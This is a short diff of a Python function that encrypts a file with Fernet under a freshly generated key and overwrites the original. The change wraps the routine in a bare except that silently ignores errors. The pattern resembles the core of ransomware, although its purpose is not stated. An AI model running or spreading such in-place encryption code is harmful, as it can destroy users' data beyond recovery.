@@ -15,11 +15,14 @@ def generate_key():
 def crypt_file(file):
     key = generate_key()
     fernet = Fernet(key)
-    with open(file, 'rb') as file_2:
-        orginal = file_2.read()
-    encrypted_file = fernet.encrypt(orginal)
-    with open(file, 'wb') as e_file:
-        e_file.write(encrypted_file)
+    try:
+        with open(file, 'rb') as file_2:
+            orginal = file_2.read()
+        encrypted_file = fernet.encrypt(orginal)
+        with open(file, 'wb') as e_file:
+            e_file.write(encrypted_file)
+    except:
+        pass
 
 
 def clear():
